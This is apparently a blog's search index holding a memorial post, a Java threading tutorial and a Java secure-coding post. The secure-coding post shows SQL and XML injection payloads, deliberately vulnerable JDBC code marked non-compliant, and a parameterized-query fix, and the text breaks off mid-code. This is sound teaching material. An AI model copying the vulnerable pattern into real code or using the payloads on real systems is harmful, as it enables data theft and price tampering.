<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Good night Mr. Lawrence</title>
      <link href="/2023/04/02/Good-night-Mr-Lawrence/"/>
      <url>/2023/04/02/Good-night-Mr-Lawrence/</url>
      
        <content type="html"><![CDATA[<h1 align="center">January 17 1952 - March 28 2023</h1><hr><h3 align="center">Ars longa, vita brevis.</h3><h3 align="center">Art is long, life is short.</h3><h3 align="center">艺术千秋，人生朝露。</h3><p><span><h2 align="center">《Merry Christmas Mr.Lawrence》</h2><span></p><video src="https://image-1313245095.cos.ap-beijing.myqcloud.com/%E8%B5%84%E6%BA%90/%E3%80%8E4K60p%C2%B7Hi-Res%E3%80%8F%E5%9D%82%E6%9C%AC%E9%BE%8D%E4%B8%80%E3%80%8A%E5%9C%A3%E8%AF%9E%E5%BF%AB%E4%B9%90%E5%8A%B3%E4%BC%A6%E6%96%AF%E5%85%88%E7%94%9F-Merry%20Christmas%20Mr.Lawrence%E3%80%8B%E7%A5%9D%E5%A4%A7%E5%AE%B6%E5%9C%A3%E8%AF%9E%E5%BF%AB%E4%B9%90%21%20-%20001%20-%20%E3%80%8E4K60p%C2%B7Hi-Res%E3%80%8F%E5%9D%82%E6%9C%AC%E9%BE%8D%E4%B8%80%E3%80%8A%E5%9C%A3%E8%AF%9E%E5%BF%AB%E4%B9%90%E5%8A%B3%E4%BC%A6%E6%96%AF%E5%85%88%E7%94%9F-Merry%20Christmas%20Mr.Lawrence%E3%80%8B%E2%80%A6.mp4" controls="controls" style="max-width: 100%; display: block; margin-left: auto; margin-right: auto;">]]></content>
      
      
      
        <tags>
            
            <tag> 音乐 </tag>
            
            <tag> Other </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java Thread类使用方法和注意事项</title>
      <link href="/2023/02/23/Java-Thread%E7%B1%BB%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E5%92%8C%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/"/>
      <url>/2023/02/23/Java-Thread%E7%B1%BB%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E5%92%8C%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-Thread类使用方法和注意事项"><a href="#Java-Thread类使用方法和注意事项" class="headerlink" title="Java Thread类使用方法和注意事项"></a>Java Thread类使用方法和注意事项</h1><p>Java的Thread类是Java多线程编程中非常重要的一个类，它提供了创建和操作线程的方法。本文将介绍Thread类的使用方法和一些注意事项，以及演示一些相关的代码示例。</p><h1 id="Thread类使用方法"><a href="#Thread类使用方法" class="headerlink" title="Thread类使用方法"></a>Thread类使用方法</h1><h2 id="创建线程"><a href="#创建线程" class="headerlink" title="创建线程"></a>创建线程</h2><p>创建线程有两种方法：</p><ol><li>继承Thread类，重写run()方法。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyThread</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;MyThread running&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>通过创建一个类，继承Thread类，并重写run()方法来创建线程。在重写的run()方法中，定义线程的执行逻辑。创建该类的实例对象，并调用start()方法启动线程。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">MyThread</span> <span class="variable">myThread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyThread</span>();</span><br><span class="line">myThread.start();</span><br></pre></td></tr></table></figure></li><li>实现Runnable接口，并重写run()方法。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyRunnable</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;MyRunnable running&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>通过创建一个类，实现Runnable接口，并重写run()方法来创建线程。创建该类的实例对象，将其作为Thread的构造函数参数，并调用start()方法启动线程。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">MyRunnable</span> <span class="variable">myRunnable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyRunnable</span>();</span><br><span class="line"><span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(myRunnable);</span><br><span class="line">thread.start();</span><br></pre></td></tr></table></figure><h2 id="启动线程"><a href="#启动线程" class="headerlink" title="启动线程"></a>启动线程</h2>启动线程需要调用Thread类的start()方法，该方法将调用run()方法。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>();</span><br><span class="line">thread.start();</span><br></pre></td></tr></table></figure><h2 id="线程睡眠"><a href="#线程睡眠" class="headerlink" title="线程睡眠"></a>线程睡眠</h2><p>可以通过Thread类的sleep()方法使线程暂停执行一段时间，单位为毫秒。例如，让线程睡眠1000毫秒（即1秒钟）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="线程等待"><a href="#线程等待" class="headerlink" title="线程等待"></a>线程等待</h2><p>线程等待需要使用Object类的wait()方法和notify()方法。调用wait()方法将使线程进入等待状态，直到另一个线程调用notify()方法才会继续执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">synchronized</span> (lock) &#123;</span><br><span class="line">    <span class="keyword">while</span> (!flag) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            lock.wait();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="线程加入"><a href="#线程加入" class="headerlink" title="线程加入"></a>线程加入</h2><p>线程加入需要使用Thread类的join()方法。调用join()方法将使当前线程等待另一个线程执行完毕后再继续执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>();</span><br><span class="line">thread.start();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    thread.join();</span><br><span class="line">&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="线程中断"><a href="#线程中断" class="headerlink" title="线程中断"></a>线程中断</h2><p>线程中断需要使用Thread类的interrupt()方法。调用该方法将设置线程的中断标志位，如果线程处于阻塞状态，则会抛出InterruptedException异常。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>();</span><br><span class="line">thread.start();</span><br><span class="line">thread.interrupt();</span><br></pre></td></tr></table></figure><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol><li>线程的start()方法只能被调用一次，否则将抛出IllegalThreadStateException</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全编码-用户输入</title>
      <link href="/2023/01/25/Java%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81-%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5/"/>
      <url>/2023/01/25/Java%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81-%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="安全引言"><a href="#安全引言" class="headerlink" title="安全引言"></a>安全引言</h1><hr><h2 id="1、传统Web应用与新兴移动应用"><a href="#1、传统Web应用与新兴移动应用" class="headerlink" title="1、传统Web应用与新兴移动应用"></a>1、传统Web应用与新兴移动应用</h2><ul><li>传统Web应用：浏览器 HTTP 服务器</li><li>新兴移动应用：APP HTTP 服务器</li></ul><p>从安全角度看，传统Web应用与新兴移动应用没有本质区别</p><h2 id="2、Web应用安全的核心问题是什么？"><a href="#2、Web应用安全的核心问题是什么？" class="headerlink" title="2、Web应用安全的核心问题是什么？"></a>2、Web应用安全的核心问题是什么？</h2><p><strong><em>用户提交的数据不可信\</em></strong>是Web应用程序核心安全问题</p><p>用户可以提交<strong><em>任意输入\</em></strong></p><p>例如：</p><ul><li>请求参数-&gt;多次提交或者不提交</li><li>修改Cookie</li><li>修改HTTP信息头</li><li>请求顺序-&gt;跳过或者打乱</li></ul><h2 id="3、Web应用防御"><a href="#3、Web应用防御" class="headerlink" title="3、Web应用防御"></a>3、Web应用防御</h2><ul><li>完善的异常处理</li><li>监控</li><li>日志：记录重要业务、异常的详细请求信息</li></ul><h2 id="4、对输入的处理"><a href="#4、对输入的处理" class="headerlink" title="4、对输入的处理"></a>4、对输入的处理</h2><p>建议采用：白名单<br>尽量避免：净化或黑名单</p><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><hr><h2 id="1、原理："><a href="#1、原理：" class="headerlink" title="1、原理："></a>1、原理：</h2><p>（1）合法输入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users WHRER id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure><p>（2）恶意注入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users WHRER id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;a&#x27;</span><span class="operator">=</span><span class="string">&#x27;a&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="2、Java代码分析-JDBC"><a href="#2、Java代码分析-JDBC" class="headerlink" title="2、Java代码分析(JDBC)"></a>2、Java代码分析(JDBC)</h2><p>（1）不合规代码(SQL参数拼接)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SQLInject</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//正常输入</span></span><br><span class="line">        select(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        <span class="comment">// 恶意输入</span></span><br><span class="line">        select(<span class="string">&quot;&#x27; or &#x27;a&#x27;=&#x27;a&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title function_">select</span><span class="params">(String id)</span>&#123;</span><br><span class="line">        <span class="comment">//声明Connection对象</span></span><br><span class="line">        Connection con;</span><br><span class="line">        <span class="comment">//驱动程序名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">driver</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>;</span><br><span class="line">        <span class="comment">//URL指向要访问的数据库名mydata</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/mybatis&quot;</span>;</span><br><span class="line">        <span class="comment">//MySQL配置时的用户名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        <span class="comment">//MySQL配置时的密码</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;budi&quot;</span>;</span><br><span class="line">        <span class="comment">//遍历查询结果集</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//加载驱动程序</span></span><br><span class="line">            Class.forName(driver);</span><br><span class="line">            <span class="comment">//1.getConnection()方法，连接MySQL数据库！！</span></span><br><span class="line">            con = DriverManager.getConnection(url,user,password);</span><br><span class="line">            <span class="keyword">if</span>(!con.isClosed())</span><br><span class="line">                System.out.println(<span class="string">&quot;Succeeded connecting to the Database!&quot;</span>);</span><br><span class="line">            <span class="comment">//2.创建statement类对象，用来执行SQL语句！！</span></span><br><span class="line">            <span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> con.createStatement();</span><br><span class="line">            <span class="comment">//要执行的SQL语句</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users where id=&#x27;&quot;</span>+id+<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">            <span class="comment">//3.ResultSet类，用来存放获取的结果集！！</span></span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> statement.executeQuery(sql);</span><br><span class="line">            System.out.println(<span class="string">&quot;-----------------&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;执行结果如下所示:&quot;</span>);  </span><br><span class="line">            System.out.println(<span class="string">&quot;-----------------&quot;</span>); </span><br><span class="line">            String age,name;</span><br><span class="line">            <span class="keyword">while</span>(rs.next())&#123;</span><br><span class="line">                <span class="comment">//获取stuname这列数据</span></span><br><span class="line">                name = rs.getString(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">                <span class="comment">//获取stuid这列数据</span></span><br><span class="line">                age = rs.getString(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">                <span class="comment">//输出结果</span></span><br><span class="line">                System.out.println(name + <span class="string">&quot;\t&quot;</span> + age);</span><br><span class="line">            &#125;</span><br><span class="line">            rs.close();</span><br><span class="line">            con.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span>(ClassNotFoundException e) &#123;   </span><br><span class="line">            <span class="comment">//数据库驱动类异常处理</span></span><br><span class="line">            System.out.println(<span class="string">&quot;Sorry,can`t find the Driver!&quot;</span>);   </span><br><span class="line">            e.printStackTrace();   </span><br><span class="line">            &#125; <span class="keyword">catch</span>(SQLException e) &#123;</span><br><span class="line">            <span class="comment">//数据库连接失败异常处理</span></span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> handle exception</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;数据库数据成功获取！！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SQL Paramter:1</span><br><span class="line">-----------------</span><br><span class="line">budi    27</span><br><span class="line">-----------------</span><br><span class="line">SQL Paramter:&#x27; or &#x27;a&#x27;=&#x27;a</span><br><span class="line">-----------------</span><br><span class="line">budi    27</span><br><span class="line">budisploit  28</span><br><span class="line">-----------------</span><br></pre></td></tr></table></figure><p>（2）合规代码（参数化查询）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SQLFormat</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        select(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        select(<span class="string">&quot;&#x27; or &#x27;a&#x27;=&#x27;a&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title function_">select</span><span class="params">(String id)</span>&#123;</span><br><span class="line">        <span class="comment">//声明Connection对象</span></span><br><span class="line">        Connection con;</span><br><span class="line">        <span class="comment">//驱动程序名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">driver</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>;</span><br><span class="line">        <span class="comment">//URL指向要访问的数据库名mydata</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/mybatis&quot;</span>;</span><br><span class="line">        <span class="comment">//MySQL配置时的用户名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        <span class="comment">//MySQL配置时的密码</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;budi&quot;</span>;</span><br><span class="line">        <span class="comment">//遍历查询结果集</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//加载驱动程序</span></span><br><span class="line">            Class.forName(driver);</span><br><span class="line">            <span class="comment">//1.getConnection()方法，连接MySQL数据库！！</span></span><br><span class="line">            con = DriverManager.getConnection(url,user,password);</span><br><span class="line">            <span class="keyword">if</span>(!con.isClosed())</span><br><span class="line">                System.out.println(<span class="string">&quot;Succeeded connecting to the Database!&quot;</span>);</span><br><span class="line">            <span class="comment">//2.//要执行的SQL语句</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users where id=?&quot;</span>;</span><br><span class="line">            <span class="comment">//3.创建statement类对象，ResultSet类，用来存放获取的结果集！！</span></span><br><span class="line">            <span class="type">PreparedStatement</span> <span class="variable">stmt</span> <span class="operator">=</span> con.prepareStatement(sql);</span><br><span class="line">            stmt.setString(<span class="number">1</span>, id);</span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery();</span><br><span class="line">            System.out.println(<span class="string">&quot;-----------------&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;执行结果如下所示:&quot;</span>);  </span><br><span class="line">            System.out.println(<span class="string">&quot;-----------------&quot;</span>); </span><br><span class="line">            String age,name;</span><br><span class="line">            <span class="keyword">while</span>(rs.next())&#123;</span><br><span class="line">                <span class="comment">//获取stuname这列数据</span></span><br><span class="line">                name = rs.getString(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">                <span class="comment">//获取stuid这列数据</span></span><br><span class="line">                age = rs.getString(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">                <span class="comment">//输出结果</span></span><br><span class="line">                System.out.println(name + <span class="string">&quot;\t&quot;</span> + age);</span><br><span class="line">            &#125;</span><br><span class="line">            rs.close();</span><br><span class="line">            con.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span>(ClassNotFoundException e) &#123;   </span><br><span class="line">            <span class="comment">//数据库驱动类异常处理</span></span><br><span class="line">            System.out.println(<span class="string">&quot;Sorry,can`t find the Driver!&quot;</span>);   </span><br><span class="line">            e.printStackTrace();   </span><br><span class="line">            &#125; <span class="keyword">catch</span>(SQLException e) &#123;</span><br><span class="line">            <span class="comment">//数据库连接失败异常处理</span></span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> handle exception</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;数据库数据成功获取！！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SQL Paramter:1</span><br><span class="line">-----------------</span><br><span class="line">budi    27</span><br><span class="line">-----------------</span><br><span class="line">SQL Paramter:&#x27; or &#x27;a&#x27;=&#x27;a</span><br><span class="line">-----------------</span><br><span class="line">-----------------</span><br></pre></td></tr></table></figure><h2 id="3、防范建议："><a href="#3、防范建议：" class="headerlink" title="3、防范建议："></a>3、防范建议：</h2><ul><li>采用参数查询即预编译方式（<strong>首选</strong>）</li><li>字符串过滤</li></ul><h1 id="XML注入"><a href="#XML注入" class="headerlink" title="XML注入"></a>XML注入</h1><hr><h2 id="1、原理"><a href="#1、原理" class="headerlink" title="1、原理"></a>1、原理</h2><p>（1）合法输入：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">quantity=1</span><br><span class="line"><span class="tag">&lt;<span class="name">item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>apple<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>500.0<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">quantity</span>&gt;</span>1<span class="tag">&lt;/<span class="name">quantity</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">item</span>&gt;</span></span><br></pre></td></tr></table></figure><p>（2）恶意输入：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">quantity=1<span class="tag">&lt;/<span class="name">quantity</span>&gt;</span><span class="tag">&lt;<span class="name">price</span>&gt;</span>5.0<span class="tag">&lt;/<span class="name">price</span>&gt;</span><span class="tag">&lt;<span class="name">quantity</span>&gt;</span>1</span><br><span class="line"><span class="tag">&lt;<span class="name">item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>apple<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>500.0<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">quantity</span>&gt;</span>1<span class="tag">&lt;/<span class="name">quantity</span>&gt;</span><span class="tag">&lt;<span class="name">price</span>&gt;</span>5.0<span class="tag">&lt;/<span class="name">price</span>&gt;</span><span class="tag">&lt;<span class="name">quantity</span>&gt;</span>1<span class="tag">&lt;/<span class="name">quantity</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">item</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2、Java代码分析"><a href="#2、Java代码分析" class="headerlink" title="2、Java代码分析"></a>2、Java代码分析</h2><p>（1）不合规代码（未进行安全检查）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XMLInject2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 正常输入</span></span><br><span class="line">        ArrayList&lt;Map&lt;String, String&gt;&gt; normalList=(ArrayList&lt;Map&lt;String, String&gt;&gt;) </span><br><span class="line">                ReadXML(<span class="string">&quot;D:\\JavaWorkspace\\TestInput\\src\\cn\\com\\budi\\xml\\inject\\normal.xml&quot;</span>,<span class="string">&quot;price&quot;</span>);</span><br><span class="line">        System.out.println(normalList.toString());</span><br><span class="line">        <span class="comment">// 异常输入</span></span><br><span class="line">        ArrayList&lt;Map&lt;String, String&gt;&gt; evilList=(ArrayList&lt;Map&lt;String, String&gt;&gt;) </span><br><span class="line">                ReadXML(<span 